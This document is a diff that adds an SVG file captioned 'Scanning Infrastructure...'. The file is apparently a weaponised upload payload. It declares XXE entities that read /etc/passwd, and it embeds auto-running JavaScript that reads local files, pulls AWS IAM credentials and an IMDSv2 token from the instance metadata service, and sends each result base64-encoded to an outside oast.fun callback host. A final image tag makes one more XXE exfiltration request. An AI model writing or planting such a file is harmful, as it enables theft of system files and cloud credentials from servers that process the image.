@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg [
+  <!ENTITY % passwd SYSTEM "file:///etc/passwd">
+  <!ENTITY % remote SYSTEM "http://fbfhefiixaypitfaeihh5lr3fldou68h0.oast.fun/xxe_check">
+]>
+<svg width="600" height="600" xmlns="http://www.w3.org/2000/svg">
+  <rect width="100%" height="100%" fill="white" />
+  <text x="10" y="40" font-family="Arial" font-size="20">Scanning Infrastructure...</text>
+
+  <script type="text/javascript">
+    (async function() {
+      const oast = "http://fbfhefiixaypitfaeihh5lr3fldou68h0.oast.fun";
+      const exfil = (path, data) => fetch(`${oast}/${path}/${btoa(data).replace(/\//g, '_')}`, {mode:'no-cors'});
+
+      // A. Try /etc/passwd via JS (Local File Read)
+      try {
+          const p = await fetch("file:///etc/passwd");
+          const pt = await p.text();
+          exfil("passwd", pt);
+      } catch(e) { exfil("err", "file_proto_blocked"); }
+
+      // B. Try AWS Metadata (IMDSv1)
+      try {
+          const m = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
+          const mt = await m.text();
+          exfil("aws_role", mt);
+          
+          // If role found, get full creds
+          const c = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + mt.trim());
+          const ct = await c.text();
+          exfil("aws_keys", ct);
+      } catch(e) {}
+
+      // C. Try AWS Metadata (IMDSv2 Token Bypass)
+      try {
+          const t = await fetch("http://169.254.169.254/latest/api/token", {
+              method: "PUT",
+              headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" }
+          });
+          const token = await t.text();
+          const m2 = await fetch("http://169.254.169.254/latest/meta-data/hostname", {
+              headers: { "X-aws-ec2-metadata-token": token }
+          });
+          exfil("aws_v2_host", await m2.text());
+      } catch(e) {}
+    })();
+  </script>
+
+  <image href="http://fbfhefiixaypitfaeihh5lr3fldou68h0.oast.fun/xxe_trigger?data=&passwd;" width="1" height="1" />
+</svg>
